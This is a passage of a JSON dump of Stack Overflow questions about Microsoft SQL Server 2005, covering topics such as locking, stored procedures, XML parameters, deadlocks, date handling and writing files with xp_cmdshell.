sick to my stomach?  Also we are using MS SQL, and have to support as far back as 2005.</p>\n"},{"tags":["sql-server-2005","locking"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":353,"score":0,"question_id":10821282,"title":"Default locking for SQL Server 2005 - Row level or Page level","body":"<p>Does SQL Server 2005 use row level locking or page level locking as a default?   I'm getting some timeout errors on some of my UPDATEs and wonder if it's related to the default locking mechanism.  </p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":99,"score":2,"question_id":10814504,"title":"SQL - Calculating columns using dynamic functions","body":"<p>I'm trying to create a set of data that I'm going to write out to a file, it's essentially a report composed of various fields from a number of different tables, some columns need to have some processing done on them, some can just be selected.</p>\n\n<p>Different users will likely want different processing performed on certain columns, and in the future, I'll probably need to add additional functions for computed columns.</p>\n\n<p>I'm considering the cleanest/most flexable approach to storing and using all the different functions I'm likely to need for these computed columns, I've got two ideas in my head, but I'm hoping there might be a much more obvious solution I'm missing.</p>\n\n<p>For a simple, slightly odd example, a Staff table:</p>\n\n<pre><code>Employee |    DOB           |   VacationDays\nFrank    |    01/01/1970    |   25\nMike     |    03/03/1975    |   24\nDave     |    05/02/1980    |   30\n</code></pre>\n\n<p>I'm thinking I'd either end up with a query like</p>\n\n<pre><code>SELECT NameFunction(Employee, optionID),\n       DOBFunction(DOB, optionID),\n       VacationFunction(VacationDays, optionID),\nfrom Employee\n</code></pre>\n\n<p>With user defined functions, where the optionID would be used in a case statement inside the functions to decide what processing to perform.</p>\n\n<p>Or I'd want to make the way the data is returned customisable using a lookup table of other functions:</p>\n\n<pre><code>ID  |    Name                  |   Description\n1   |    ShortName             |   Obtains 3 letter abbreviation of employee name\n2   |    LongDOB               |   Returns DOB in format ~ 1st January 1970\n3   |    TimeStampDOB          |   Returns Timestamp for DOB\n4   |    VacationSeconds       |   Returns Seconds of vaction time\n5   |    VacationBusinessHours |   Returns number of business hours of vacation\n</code></pre>\n\n<p>Which seems neater, but I'm not sure how I'd formulate the query, presumably using dynamic SQL? Is there a sensible alternative?</p>\n\n<p>The functions will be used on a few thousand rows.</p>\n\n<p>The closest answer I've found was in this thread:\n<a href=\"http://stackoverflow.com/questions/10557258/call-dynamic-function-name-in-sql\">Call dynamic function name in SQL</a></p>\n\n<p>I'm not a huge fan of dynamic SQL, although in this case I think it might be the best way to get the result I'm after?</p>\n\n<p>Any replies appreciated,\nThanks,\nChris</p>\n"},{"tags":["sql-server","sql-server-2005","linked"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":690,"score":1,"question_id":4378415,"title":"Database Connectivity using Linked Server. (Numeric Values)","body":"<p>So I established a connection from my SQL Server 2008 Express Edition to our Oracle Database.\nWhen I query varchar based values, it is fine, but for any numeric value, it throws me an error like this one.</p>\n\n<pre><code>Msg 9803, Level 16, State 1, Line 1\nInvalid data for type \"numeric\".\n</code></pre>\n\n<p>How do I get around this?</p>\n"},{"tags":["sql","performance","sql-server-2005","date","time"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":106,"score":0,"question_id":10814205,"title":"get records from yesterday from log table","body":"<p>Scenario:</p>\n\n<p>log table with a considerable amount of records (2 Million) with a timestamp field.\nno indexes except for the ID as a primary key, and index (or any other persistent object) creation is out of the question</p>\n\n<p>I want to select all records from yesterday.</p>\n\n<p>I know there are a few ways of doing it, I just would like opinion on the \"best\" way, and by best I mean fastest.</p>\n\n<p>the trick here is the \"time\" of the timestamp, because if now is 11AM and I do something like:</p>\n\n<pre><code>where modifiedDate between dateadd(dd,-1,getdate()) and getdate()\n</code></pre>\n\n<p>Ill get records only from yesterday at 11 and will get data from today</p>\n\n<p>Its sql 2005 so there is no \"Date\" datatype</p>\n"},{"tags":["sql","sql-server-2005","vba"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":205,"score":0,"question_id":10812424,"title":"writing copyfromrecordset to range","body":"<p>I've got the following vba, it reads in the MCO from cell C10 onwards until its empty and will grab the number of machines, number of decrypts and upgrading machines from a SQL database.</p>\n\n<p>That works fine but I'm having trouble getting the data in the corresponding row. At the moment it always write the data to D10 coz I've hard coded it but I'm not sure how to get this to increment or write to the same row that the MCO has been read in from. I'm having the same problem if the record set is empty. I'd like to insert 0 0 0 in to the 3 columns </p>\n\n<p>Any help would be most appreciated </p>\n\n<pre><code>Sub Summary_Click()\n\nDim MyConnObj As New ADODB.Connection 'ADODB Connection Object\nDim myRecSet As New ADODB.Recordset 'Recordset Object\nDim sqlStr As String ' String variable to store sql command\n\nRange(\"D9:F34\").Select\nRange(\"D9:F34\").Clear\n\nRange(\"C10\").Select\n\nSet myRecSet = New ADODB.Recordset\n\nDo Until IsEmpty(ActiveCell)\n    strMCO = ActiveCell.Value\n\n    MyConnObj.Open _\n        \"Provider = sqloledb;\" &amp; _\n        \"Data Source=xxx;\" &amp; _\n        \"Initial Catalog=xxx;\" &amp; _\n        \"User ID=xxx;\" &amp; _\n        \"Password=xxx;\"\n\n    strqa = \" SELECT Count (distinct DeviceData.machinename) As [Number Of Devices], sum(case buildstatus when 'Decrypted' then 1 else 0 end) Decrypted, sum(case buildstatus when 'Upgrading' then 1 else 0 end) Upgrading, SiteList.Region \"\n    strqb = \" FROM dbo.DeviceData JOIN dbo.SiteList ON dbo.DeviceData.CurrentSite = dbo.SiteList.SiteCode\"\n    strqc = \" where MCO = '\" &amp; strMCO &amp; \"' \"\n    strqd = \" group by DeviceData.Country, SiteList.Region\"\n\n    sqlStr = strqa &amp; strqb &amp; strqc &amp; strqd\n\n    myRecSet.Open sqlStr, MyConnObj, adOpenKeyset\n\n    ActiveCell.Offset(0, 1).Select\n\n    ActiveSheet.Range(\"D10\").CopyFromRecordset myRecSet\n    'ActiveSheet.Range(\"D&lt;10 + 1&gt;).CopyFromRecordset myRecSet\n\n    If myRecSet.RecordCount = 0 Then\n        ActiveSheet.Range(\"D10, E10, F10\") = \"0\"\n    End If\n\n    ActiveCell.Offset(1, -1).Select\n    MyConnObj.Close\nLoop\n\nEnd Sub\n</code></pre>\n"},{"tags":["sql-server-2005","cakephp"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":10813473,"title":"SQL Data Table From PHP","body":"<p>Can We Create a <strong>Data table</strong> for <strong>SQL Stored Procedure</strong> From <strong><em>PHP</em></strong> ?</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":10810642,"title":"Query to select the month and nos of weekend and public holiday in that month","body":"<p>My database table Holiday  includes field ad Holidaydate->datetime , WeekendHoliday->bit, PublicHoliday->bit \nI want the nos of weekendholiday and also publicholiday  in a specific month year.</p>\n\n<p>My table values are as(example)</p>\n\n<pre><code>Holidaydate       WeekendHoliday       PublicHoliday \n-----------       --------------       -------------\n4/02/2012             true                 false\n4/20/2012             true                 false\n5/3/2012              true                 False\n5/30/2012             false                true\n4/05/2013             false                true   \n</code></pre>\n\n<p>So now output should be like this:</p>\n\n<pre><code>year      Month   count(weekend)   count(public)\n----      -----   --------------   -------------\n2012      April      2               0\n2012      May        1               1\n2013      April      0               1\n</code></pre>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":10811031,"title":"How do I delete the first matching record in Table B for each record in Table A?","body":"<p>Table A contains multiple records that should be deleted from Table B.  However, there can be multiple records in Table B that match a single record in Table A.  I only want to delete the first matching record in Table B for each record in Table A.  If there are 50 records in Table A then a maximum of 50 records should be deleted from Table B.  I'm using the SQL statement below which is deleting more records from Table B than are listed in Table A due to multiple matches.  I can not further restrict the matching criteria in my statement due to limitations in the data.</p>\n\n<pre><code>DELETE FROM [#DraftInvoiceRecords] FROM [#DraftInvoiceRecords]\nINNER JOIN [#ReversedRecords]\nON [#DraftInvoiceRecords].employee = [#ReversedRecords].employee \n  and [#DraftInvoiceRecords].amount = [#ReversedRecords].amount\n  and [#DraftInvoiceRecords].units = [#ReversedRecords].units\n</code></pre>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":493,"score":0,"question_id":10811441,"title":"Using stored procedure to insert data from selection","body":"<p>I need to insert data into another table using stored procedure that looks something like this:</p>\n\n<pre><code>CREATE PROCEDURE T.countnum\nAS\n   Insert into T1 values(select count(*) from T.countTable)\n</code></pre>\n\n<p>But it isn't working I saw several example but not with selection. Any example?</p>\n"},{"tags":["sql-server-2005","cakephp-1.3"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":90,"score":0,"question_id":10811819,"title":"Pass Data Table to SQL Stored Procedure From PHP Code","body":"<p>I Have a Stored Procedure Which is used to insert data in to a <strong><em>Header Table</em></strong> and <strong><em>Details Table</em></strong>.The Details Table Entry in made possible with the help of a Data Table in this Stored Procedure. <strong><em>So I need to pass Data From PHP to this Data Table.</em></strong> Is there Any Methods Exits To Make this Possible ? Any answers are welcome......</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":10807453,"title":"can't drop sp_makewebtask","body":"<p>I have a need to remove sp_makewebtask in sql server 2005 to make the server more secure.  I am logging in with a user that is in the sysadmin role however when I try \nto run the command:<br>\ndrop procedure sp_makewebtask \nI receive: \nMsg 3701, Level 11, State 5, Line 1 \nCannot drop the procedure 'sp_makewebtask', because it does not exist \nor you do not have permission. </p>\n\n<p>The same thing happens for xp_makewebtask.  Is it possible to drop \nthese procedures?  If so how do I do it? </p>\n\n<p>I can see in the object explorer and sp_help shows the details of the procedure so I know it exists...I am sysadmin so I should have full permissions...</p>\n\n<p>I have tried specifying the schema, using the dropextendedproc procedure, logging in as SA, to no avail. </p>\n"},{"tags":["tsql","sql-server-2005","stored-procedures","xquery","dynamic-sql"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":106,"score":0,"question_id":10800106,"title":"Dynamic SQL parameters referencing, other parameters with values containing predefined operators","body":"<p>I have a situation in a T-SQL stored procedure, where in a dynamic SQL, the parameter/s, referencing other parameters whose values, containing single quotes and/or other predefined operators. Attached is a sample code, demonstrating such a situation.\nAny Idea how to solve such a case?</p>\n\n<pre><code>    DECLARE @TransVocObj  XML,@xmlfragment XML,@SQL NVARCHAR(MAX)\nSELECT @TransVocObj  =  '&lt;TransactionVoucherViewModel&gt;&lt;TransactionRows&gt;&lt;/TransactionRows&gt;&lt;/TransactionVoucherViewModel&gt;'\n                DECLARE @Narration varchar(100)\n                SET @Narration ='AABBCC''DD''EEFF'-- @Narration ='AABBCCDDEEFF'\n                Select @xmlfragment=\n                '&lt;TransactionRow&gt;'+'&lt;Description&gt;'+@Narration +'&lt;/Description&gt;'+'&lt;DebitAmount&gt;'+CONVERT(VARCHAR(30),500.00)+'&lt;/DebitAmount&gt;'+'&lt;/TransactionRow&gt;'\n                SET @SQL=N' SET @TransVocObj.modify(''insert '+ CONVERT(NVARCHAR(MAX),@xmlfragment)+'   into (/TransactionVoucherViewModel/TransactionRows)[1] '') '\n                EXECUTE sp_executesql @SQL,N'@TransVocObj XML Output,@xmlfragment XML',@TransVocObj OUTPUT,@xmlfragment\nSELECT T.Item.query('.//Description').value('.','VARCHAR(60)') FROM  @TransVocObj.nodes('//TransactionRows/TransactionRow') AS T(Item)\n</code></pre>\n\n<p>The database server is MS SQL SERVER 2005</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":10803863,"title":"Convert Bit field table to table","body":"<p>I have a table showing locations with a BIT column for each tool in use at each location:</p>\n\n<pre><code>CREATE TABLE dbo.[ToolsSelected] (\n    [LocationID] NVARCHAR(40) NOT NULL,\n    [Tool1] INTEGER DEFAULT 0 NOT NULL,\n    [Tool2] INTEGER DEFAULT 0 NOT NULL,\n    [Tool3] INTEGER DEFAULT 0 NOT NULL,\n    [Tool4] INTEGER DEFAULT 0 NOT NULL,\n    PRIMARY KEY ([LocationID])\n);\n\nLocID  Tool1  Tool2  Tool3  Tool4\n-----  -----  -----  -----  -----\nAZ     0      1      1      0\nNY     1      0      1      1\n</code></pre>\n\n<p>I need to convert this to a table by LocationID indicating which tools at which locations:</p>\n\n<pre><code>CREATE TABLE dbo.[ByLocation] (\n    [LocationID] NVARCHAR(40) NOT NULL,\n    [Tool] NVARCHAR(40) NOT NULL,  -- Column title of ToolsSelected table\n    PRIMARY KEY ([LocationID],  [Tool])\n);\n\nLocID  Tool\n-----  -----\nAZ     Tool2\nAZ     Tool3\nNY     Tool1\nNY     Tool3\nNY     Tool4\n</code></pre>\n\n<p>The idea is that each location can select the tools they need, I then need to query the tools table to get details (versions, etc) for each tool selected. Each location is unique; each tool is unique. Is there a way to do this or a much better implementation?</p>\n"},{"tags":["xml","sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":662,"score":2,"question_id":10745877,"title":"Accessing Xml Parameters Efficiently in a Stored Procedure","body":"<p>I am trying to optimize a stored procedure that relies on a few <code>XML</code> type parameters for variable input.  Analysis of the execution plan shows a high cost associated with accessing the data in these parameters. </p>\n\n<p>Given:</p>\n\n<pre><code>DECLARE @FirstNameXML  XML;\n</code></pre>\n\n<p>In the format of </p>\n\n<pre><code>&lt;FirstNames&gt;\n  &lt;Name&gt;John&lt;/Name&gt;\n  &lt;Name&gt;Joe&lt;/Name&gt;\n&lt;/FirstNames&gt;\n</code></pre>\n\n<p>There are a few operations I need to perform (assuming the parameter is non-null):</p>\n\n<p><strong>Count of Names supplied</strong></p>\n\n<pre><code>SET @FirstNameCount = \n  (SELECT COUNT(FirstNameValues.Name.value('.','VARCHAR(50)'))\n  FROM @FirstNameXML.nodes('/FirstNames/Name') \n  AS FirstNameValues(Name))\n</code></pre>\n\n<p><strong>If count = 1</strong></p>\n\n<pre><code>...\nAND First_Name LIKE\n  (SELECT TOP(1) FirstNameValues.Name.value('.','VARCHAR(50)') + '%'\n  FROM @FirstNameXML.nodes('/FirstNames/Name') \n  AS FirstNameValues(Name))\n...\n</code></pre>\n\n<p><strong>Else if count > 1</strong></p>\n\n<pre><code>...\nAND First_Name IN\n(SELECT FirstNameValues.Name.value('.','VARCHAR(50)')\n  FROM @FirstNameXML.nodes('/FirstNames/Name') \n  AS FirstNameValues(Name))\n...\n</code></pre>\n\n<p>I have tried a few optimizations:</p>\n\n<p><strong>Changing the count query to</strong>:</p>\n\n<pre><code>SET @FirstNameCount = \n  (SELECT CAST(CAST(@FirstNameXML.query('count(/FirstNames/Name)') \n    AS VARCHAR(10)) AS INT)\n</code></pre>\n\n<p><strong>Changing the count == 1 query to</strong>:</p>\n\n<pre><code>...\nAND First_Name LIKE\n  (SELECT @FirstNameXML.value('(/FirstNames/Name)[1]', 'VARCHAR(50)') + '%')\n...\n</code></pre>\n\n<p>Somehow the stored procedure runs even slower after the optimizations even though the changes seem to have reduced the cost in the execution plan.  This leaves me with a few questions:</p>\n\n<ol>\n<li><strong>Am I misunderstanding the optimizations I've implemented?</strong>  </li>\n<li><strong>Is there a more efficient way to go about this as a whole?</strong> (XML parameter based querying)</li>\n</ol>\n"},{"tags":["sql","tsql","sql-server-2005","upsert"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":197,"score":1,"question_id":10802089,"title":"Bulk Upsert SQL Server 2005","body":"<p>Is there a way to bulk upsert in SQL Server 2005? Something akin to 2008's MERGE would be perfect. I have one table working as a temp workspace that will need to be reconciled to the main table on session complete. In 2008, merge would do great for this, but the only 2005 methods I've seen are for individual upserts, not bulk. Ideas?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":6,"favorite_count":0,"up_vote_count":11,"down_vote_count":4,"view_count":1113,"score":7,"question_id":10747963,"title":"Why can't I perform an aggregate function on an expression containing an aggregate but I can do so by creating a new select statement around it?","body":"<p>Why is it that in SQL Server I can't do this:</p>\n\n<pre><code>select  sum(count(id)) as 'count'\nfrom    table\n</code></pre>\n\n<p>But I can do</p>\n\n<pre><code>select sum(x.count)\nfrom\n(\n    select  count(id) as 'count'\n    from    table   \n) x\n</code></pre>\n\n<p>Are they not essentially the same thing? How am I meant to be thinking about this in order to understand why the first block of code isn't allowed?</p>\n"},{"tags":["sql-server-2005","datetime","timestamp","sql-server-2008-r2"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":567,"score":1,"question_id":10607195,"title":"SQL Server 2008. Difficulty in setting date and time \"timestamp\"","body":"<p>I am using MS SQL Server 2008 R2 and I need to have a cell in each row with the date and time of when the row was inserted in the database. Now as I want to script and then load the database in MS SQL Server 2005 I Cannot use datetime or date so I tried to use getdate() function in the Computed Column Specification property. Can anyone please help me.</p>\n\n<p>Thanks </p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":117,"score":1,"question_id":10739147,"title":"Printing the current value and previous value between the date range","body":"<p>I have a sample data like this</p>\n\n<pre><code>ID     DATE           TIME     STATUS \n---------------------------------------------\nA      01-01-2000     0900     ACTIVE \nA      05-02-2000     1000     INACTIVE \nA      01-07-2000     1300     ACTIVE \nB      01-05-2005     1000     ACTIVE \nB      01-08-2007     1050     ACTIVE\nC      01-01-2010     0900     ACTIVE \nC      01-07-2010     1900     INACTIVE\n</code></pre>\n\n<p>From the above data set, if we only focus on <code>ID='A'</code> we note that <code>A</code> was initally active, then became inactive on <code>05-02-2000</code> and then it was inactive until <code>01-07-2000</code>. </p>\n\n<p>Which means that <code>A</code> was inactive from <code>05-Feb-2000</code> to <code>01-July-2000</code>.</p>\n\n<p>My questions are: </p>\n\n<ol>\n<li><p>if I execute a query with <code>(ID=A, Date=01-04-2000)</code> it should give me </p>\n\n<pre><code>A      05-02-2000     1000     INACTIVE \n</code></pre>\n\n<p>because since that date is not available in that data set, it should search for the previous one and print that</p></li>\n<li><p>Also, if my condition is <code>(ID=A, Date=01-07-2000)</code> it should not only print the value which is present in the table, but also print a previous value</p>\n\n<pre><code>A      05-02-2000     1000     INACTIVE \nA      01-07-2000     1300     ACTIVE \n</code></pre></li>\n</ol>\n\n<p>I would really appreciate if any one can assist me solve this query. I am trying my best to solve this.</p>\n\n<p>Thank you every one.</p>\n\n<p>Any take on this?</p>\n\n<p>Afaq</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":151,"score":0,"question_id":10799785,"title":"Get rows from the table using row no in sql server","body":"<p>I want to get rows from 100-150 from my table in sql server 2008, how i can do that? Is there any way to do so? as much i search Limit keyword is available in mysql but for sql server use common table technique but i don't want to do like that is there any other way available as it is available in Mysql?</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":184,"score":0,"question_id":9943366,"title":"Retrieve min and max time from same table in sql server","body":"<p>I have a table that have sigh in and  sign out value</p>\n\n<pre><code>**id   Date     Time   Status**\n  01   1/02/12  8:10   Entry\n  01   1/02/12  9:00   Exit\n  01   1/02/12  9:10   entry\n  01   1/02/12  17:00  Exit\n  02   1/02/12  8:10   Entry\n  02   1/02/12  9:00   Exit\n  02   1/02/12  9:10   entry\n  02   1/02/12  17:00  Exit\n  **03   1/02/12  17:00  Exit**\n</code></pre>\n\n<p>I have to find out only min and max time of each id </p>\n\n<p>Expected result</p>\n\n<pre><code>**id   Date     Entry     Exit  **\n  01   1/02/12  8:10      17:00\n  02   1/02/12  8:10      17:00\n</code></pre>\n\n<p>Please Help me</p>\n\n<p>This code Works fine But incase one Entry is not added only exit is added then\ni Want to display </p>\n\n<pre><code>id   Date     Entry Exit\n---- -------- ----- -----\n01   01/02/12 08:10 17:00\n02   01/02/12 08:10 17:00\n**03   01/02/12 Null  17:00**\n</code></pre>\n\n<p>Please help me\nThanks in advance</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":698,"score":1,"question_id":10138116,"title":"Altering column size in SQL Server","body":"<p>I would like to change the column size of the <code>salary</code> column in the <code>employee</code> table from <code>numeric(18,0)</code> to <code>numeric(22,5)</code></p>\n\n<p>Can some tell me how to do it?</p>\n"},{"tags":["file","sql-server-2005","utf-8","xp-cmdshell"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":389,"score":0,"question_id":10795251,"title":"Write to file with xp_cmdshell in UTF-8","body":"<p>I am creating files with xp_cmdshell like this:</p>\n\n<pre><code>SELECT @command = 'echo ' + @fileContent + ' &gt; e:\\out\\' + @fileName + '.csv'\nexec master.dbo.xp_cmdshell 'mkdir \"e:\\out\\\"'\nexec master..xp_cmdshell @command \n</code></pre>\n\n<p>The problem is that the file contents is not in UTF-8 and so some special characters are wrong.</p>\n\n<p>Can i create the file in UTF-8 encoding?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","triggers"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":281,"score":0,"question_id":10795513,"title":"Trigger Types in SQL Server","body":"<p>I was going through the different type of Triggers from <strong><a href=\"http://www.codeproject.com/Articles/25600/Triggers-Sql-Server\" rel=\"nofollow\">here</a></strong></p>\n\n<p>This article is sayiong triggers are classified into two main types:- </p>\n\n<ul>\n<li><p>After Triggers  // This fires after row is inserted/updated/deleted </p></li>\n<li><p>Instead Of Triggers  // This fires before the row is inserted/updated/deleted</p></li>\n</ul>\n\n<p>In which category does the following trigger fit?</p>\n\n<pre><code>create trigger TriggerName\non TableName For Insert\nAs\n</code></pre>\n"},{"tags":["sql","sql-server-2005","deadlock"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":144,"score":2,"question_id":10794717,"title":"SQL Update causing deadlock","body":"<p>We recently moved some code from C# to SQL (SQL Server 2005) to try and prevent concurrency issues. However in SQL we are now getting deadlocks. I'm not able to recreate the steps to get the deadlock, however I was able to capture it in SQL trace.</p>\n\n<p>There are no triggers on the table, but there are a couple of indexes to support searching.</p>\n\n<p>According to the trace, the deadlock is being caused by two people running the same update statement, on the same record:</p>\n\n<pre><code>UPDATE myTable\nSET\n  col2 = @var2 + col2\n  ,col3 = CASE WHEN (@Var2 &lt;= 0 OR @Var2 + Col2 &lt;= 0)\n            THEN Col3\n          ELSE\n            CONVERT\n            (\n               dbo.MoneyInfo,\n               @var3 + ':' + @Var4 + ':' + @Var5\n            )\n          END\nOUTPUT INSERTED.Col0,\n       Inserted.Col2,\n       Inserted.Col3\nWHERE Col0 = @Var1\n</code></pre>\n\n<p><code>dbo.MoneyInfo</code> is a custom CLR type. The table looks something like:</p>\n\n<pre><code>create table myTable\n(\n    col0 int,\n    col1 int,\n    col2 decimal(18,2),\n    col3 dbo.MoneyInfo\n)\n</code></pre>\n\n<p>Col0 is non-clustered primary key (PK_Stock), col1 is clustered index (IX_Item)</p>\n\n<p>This is the deadlock graph from the trace:</p>\n\n<p><img src=\"http://i.stack.imgur.com/f8D5Z.png\" alt=\"Deadlock graph\"></p>\n\n<p>I don't understand how 2 people running the exact same stored proc statement can end up in a deadlock on the same statement. Shouldn't the first connection lock the record, forcing the 2nd one to wait for it to become available? Is there anything else I can look into for the cause of this deadlock? Could it be because of the OUTPUT statement?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":660,"score":1,"question_id":10792631,"title":"Incorrect syntax near the keyword 'with'. If this statement is a common table expression","body":"<pre><code>create table #temp\n(\n  pName Varchar(20),\n  DateBegin DateTime,\n  DateEnd DateTime\n)\n\nInsert Into #temp(pName, DateBegin, DateEnd)\nValues('Player1', '01/04/2012', '01/05/2012')\n\nInsert Into #temp(pName, DateBegin, DateEnd)\nValues('Player2', '02/01/2012', '02/05/2012')\n\n\nWith DateRange(dt) As\n(\n    Select Convert(Datetime, '01/01/2012')\n    UNion All\n    Select DateAdd(dd, 1, Dat.dt) From DateRange Dat Where Dat.dt &lt; CONVERT(Datetime, '01/31/2012')\n)\n\nSelect T.pName, Dt.dt from #temp T\nInner Join DateRange Dt on Dt.dt BETWEEN T.DateBegin and T.DateEnd\n\nDrop Table #temp\n</code></pre>\n\n<hr>\n\n<p>Issue is with this following code line     </p>\n\n<pre><code>With DateRange(dt) As\n</code></pre>\n\n<p>It shows following error message</p>\n\n<blockquote>\n  <p>Incorrect syntax near the keyword 'with'. If this statement is a\n  common table expression, an xmlnamespaces clause or a change tracking\n  context clause, the previous statement must be terminated with a\n  semicolon.</p>\n</blockquote>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":96,"score":0,"question_id":10791909,"title":"In a stored procedure return the result of an UPDATE with OUTPUT DELETED clause","body":"<p>I am trying to write a function that increments and returns an int column value:</p>\n\n<pre><code>CREATE PROCEDURE [GetNextTagSuffix]\nAS\nBEGIN\n\n    UPDATE [MyTable]\n    SET [NextTagSuffix] = [NextTagSuffix] + 1\n    OUTPUT DELETED.[NextTagSuffix]\n    WHERE [MyTableId] = 'SpecialCase'\n\nEND\n</code></pre>\n\n<p>The <em>OUTPUT</em> clause can output <em>INTO</em> a table variable or temp table but I just need that single value so adding it first to a table variable seems silly. Is there any way to assign that value directly to a variable and return it?</p>\n\n<p>RESOLVED using table variable:</p>\n\n<pre><code>CREATE PROCEDURE [GetNextTagSuffix]\n@TagSuffix int out\nAS\nBEGIN\n\nDECLARE @tagTable TABLE\n(\n  NextTagSuffix int\n)\n\nUPDATE [MyTable]\nSET [NextTagSuffix] = [NextTagSuffix] + 1\nOUTPUT DELETED.[NextTagSuffix] INTO @tagTable\nWHERE [MyTableId] = 'SpecialCase'\n\nSET @TagSuffix = (SELECT MAX(NextTagSuffix) FROM @tagTable)\n\nRETURN @TagSuffix\n\nEND\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","sql-server-2008","reporting-services"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":225,"score":0,"question_id":3654875,"title":"Is It Possible to Add SQL Reporting Service to SQL Server 2008 Express?","body":"<p>I joined a windows host who runs SQL Server 2008 Express (Negative Surprise)! I think this is wrong since a host should expect some medium companies join them so they should put at least standard version. I don't know much about dba, but this is my suggestion. Am i right?</p>\n\n<p>OK! Here is my question, the host has SQL Reporting Service as an extra feature added to the SQL Server 2008 Express. Does this Reporting Service suffice a small business reporting needs? Is the reporting service on Express is too limited comparing to the enterprise one?</p>\n\n<p>The support team told SQL Reporting Service on Express has same settings as the one on Enterprise.</p>\n\n<p>Any idea? Please advise ...</p>\n"},{"tags":["sql","sql-server-2005","stored-procedures"],"answer_count":3,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":2155,"score":4,"question_id":1147763,"title":"Dynamic order direction","body":"<p>I writing a SP that accepts as parameters column to sort and direction.</p>\n\n<p>I don't want to use dynamic SQL.</p>\n\n<p>The problem is with setting the direction parameter.</p>\n\n<p>This is the partial code:</p>\n\n<pre><code>SET @OrderByColumn = 'AddedDate'\nSET @OrderDirection=1;\n.\n.\n.\n ORDER BY \n      CASE WHEN @OrderByColumn='AddedDate' THEN CONVERT(varchar(50),AddedDate)          \n           WHEN @OrderByColumn='Visible' THEN CONVERT(varchar(2), Visible)    \n           WHEN @OrderByColumn='AddedBy' THEN AddedBy \t\t\n           WHEN @OrderByColumn='Title' THEN Title   \t\n      END\n</code></pre>\n"},{"tags":["sql-server-2005","historical","datamart","historical-db"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":10786424,"title":"Historical notification alerts and data marts - what is the best approach?","body":"<p>Using SQL Server 2005 for a project, I developed a notification system which retains a history of all notifications issued.  In the cases where a 1..1 relationship exists, historical data retrieval is simple.  However, in cases where a 1..* relationship exists, the historical query becomes more complex.</p>\n\n<p>Consider the scenario where someone receives a notification that you sent them message - that's 1..1.  However, in a social network scenario, where you have 1..* buddies, your buddies would receive a notification that you did, ie. uploaded a new photo.</p>\n\n<p>For the 1..* notifications, I am not looking up all the user's buddies, and as such, only one entry for the event.   The issue is here, that as more joins are added to the query, depending on the 1..* notification types, will potentially slow down the historical lookup.</p>\n\n<p>Thus, for a 1..*, adding all the matching *'s to the datamart table will solve this issue, but really inflate the table.</p>\n\n<p>I would like to hear some suggestions or recommendations from those who have experience with this kind of data scenario.</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":10784466,"title":"SQL Calculations with HH:MM:SS","body":"<p>I have a column that comes into my SQL database as a <code>varchar(10)</code>, but looks like HH:MM:SS. The column name is runTime. </p>\n\n<p>I need to convert that column to seconds and do some calculations with it and another colunm called totalItems.  totalItems is an <code>int</code> data type.  An example of one calculation would be:</p>\n\n<pre><code>totalItems/runTime\n</code></pre>\n\n<p>So, it appears as though I need to convert runTime to a decimal, and then use it in the calculation, but when I can't do that without first converting the time to seconds, or I get an error (due to the \":\").</p>\n\n<p>So, how can I possibly convert the sessionRunTime into seconds first, and then convert those seconds to a decimal data 